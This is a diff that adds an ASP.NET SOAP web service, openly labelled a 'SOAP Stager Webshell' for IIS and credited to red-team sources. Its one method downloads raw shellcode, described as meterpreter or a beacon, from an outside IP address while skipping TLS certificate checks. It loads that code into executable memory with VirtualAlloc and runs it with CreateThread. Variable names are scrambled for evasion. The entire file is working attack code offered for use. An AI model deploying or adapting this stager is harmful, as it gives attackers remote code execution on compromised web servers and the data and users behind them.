@@ -1,0 +1,55 @@
+<%@ WebService Language="C#" class="SoapStager"%>
+using System;
+using System.IO;
+using System.Web;
+using System.Web.Services;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Net.Security;
+
+// SRC: https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap
+// https://github.com/0xbad53c/webshells/tree/main/iis
+
+[WebService(Namespace = "http://microsoft.com/" ,Description ="SOAP Stager Webshell" , Name ="SoapStager")]
+[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
+public class SoapStager : MarshalByRefObject
+{
+	private static Int32 MEM_COMMIT=0x1000;
+	private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;
+
+	[System.Runtime.InteropServices.DllImport("kernel32")]
+	private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);
+
+	[System.Runtime.InteropServices.DllImport("kernel32")]
+	private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);
+
+
+    [System.ComponentModel.ToolboxItem(false)]
+    [WebMethod]
+    public string loadStage()
+    {
+        string Url = "http://10.90.255.52/beacon.bin"; //your IP and location of meterpreter or other raw shellcode
+        byte[] rzjUFlLZh;
+
+        IWebProxy defaultWebProxy = WebRequest.DefaultWebProxy;
+        defaultWebProxy.Credentials = CredentialCache.DefaultCredentials;
+
+        // in case of HTTPS
+        using (WebClient webClient = new WebClient() { Proxy = defaultWebProxy })
+        {
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
+            webClient.UseDefaultCredentials = true;
+            rzjUFlLZh = webClient.DownloadData(Url);
+        }
+
+
+        // Feel free to improve to PAGE_READWRITE & direct syscalls for more evasion
+        IntPtr fvYV5t = VirtualAlloc(IntPtr.Zero,(UIntPtr)rzjUFlLZh.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        System.Runtime.InteropServices.Marshal.Copy(rzjUFlLZh,0,fvYV5t,rzjUFlLZh.Length);
+        IntPtr owlqRoQI_ms = IntPtr.Zero;
+        IntPtr vnspR2 = CreateThread(IntPtr.Zero,UIntPtr.Zero,fvYV5t,IntPtr.Zero,0,ref owlqRoQI_ms);
+
+        return "finished";
+    }
+}
